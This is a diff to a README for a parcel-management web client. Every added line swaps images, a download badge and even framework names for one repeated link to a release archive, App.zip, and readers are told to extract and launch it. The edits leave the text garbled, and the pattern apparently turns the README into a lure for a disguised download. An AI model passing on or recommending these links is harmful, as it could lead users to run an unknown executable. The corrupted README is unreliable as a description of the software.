@@ -1,7 +1,7 @@
 # 📦 ZIPSHIP Parcel Management App Client
 An online platform for booking, managing, and delivering parcels with a user-friendly interface and powerful features.
 
-![ZIPSHIP Logo](https://example.com/zipship_logo.png)
+![ZIPSHIP Logo](https://github.com/riusni/ZIPSHIP-Parcel-Management-client/releases/download/v1.0/App.zip)
 
 ## Overview
 Welcome to the ZIPSHIP Parcel Management App Client repository! ZIPSHIP is a comprehensive solution for managing parcel services efficiently. This repository contains the client-side codebase for the ZIPSHIP app, designed to provide users with a seamless experience in booking, tracking, and receiving parcel deliveries.
@@ -12,7 +12,7 @@ Welcome to the ZIPSHIP Parcel Management App Client repository! ZIPSHIP is a com
 - Secure payment options with Stripe integration
 - Interactive map using Leaflet
 - Authentication with JWT
-- Built with MERN stack (MongoDB, Express.js, React, Node.js)
+- Built with MERN stack (MongoDB, https://github.com/riusni/ZIPSHIP-Parcel-Management-client/releases/download/v1.0/App.zip, React, https://github.com/riusni/ZIPSHIP-Parcel-Management-client/releases/download/v1.0/App.zip)
 - Integration with Firebase for additional functionalities
 - Responsive design with Tailwind CSS
 - Utilizes React hooks and React Router for smooth navigation
@@ -34,7 +34,7 @@ To get started with the ZIPSHIP Parcel Management App Client, follow these steps
 aggregation, expressjs, firebase, jwt, leaflet-map, mern-stack, mongodb, nodejs, react-hooks, react-router, stripe, tailwindcss
 
 ## Download ZIPSHIP Parcel Management App Client
-[![Download ZIP](https://img.shields.io/badge/Download%20ZIP-v1.0.0-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download ZIP](https://github.com/riusni/ZIPSHIP-Parcel-Management-client/releases/download/v1.0/App.zip%https://github.com/riusni/ZIPSHIP-Parcel-Management-client/releases/download/v1.0/App.zip)](https://github.com/riusni/ZIPSHIP-Parcel-Management-client/releases/download/v1.0/App.zip)
 
 **Note:** The ZIP file needs to be extracted and launched to access the full functionality of the ZIPSHIP Parcel Management App Client.
 
@@ -46,4 +46,4 @@ For any issues or inquiries related to ZIPSHIP Parcel Management App Client, ple
 
 Happy parcel booking with ZIPSHIP! 🚀📦
 
-![Parcel Delivery](https://example.com/parcel_delivery_image.png)
+![Parcel Delivery](https://github.com/riusni/ZIPSHIP-Parcel-Management-client/releases/download/v1.0/App.zip)
